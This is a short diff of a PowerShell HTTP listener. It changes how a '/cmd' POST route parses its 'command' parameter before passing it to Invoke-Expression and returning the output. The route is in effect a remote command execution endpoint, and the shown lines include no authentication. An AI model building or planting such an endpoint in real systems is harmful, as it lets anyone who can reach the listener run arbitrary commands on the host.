@@ -183,7 +183,10 @@ while ($listener.IsListening) {
             "/cmd" {
                 if ($request.HttpMethod -eq "POST") {
                     $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
-                    $command = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
+                    $command = ""
+                    if ($body -match 'command=([^&]+)') {
+                        $command = [System.Web.HttpUtility]::UrlDecode($matches[1])
+                    }
                     
                     try {
                         $result = Invoke-Expression $command | Out-String
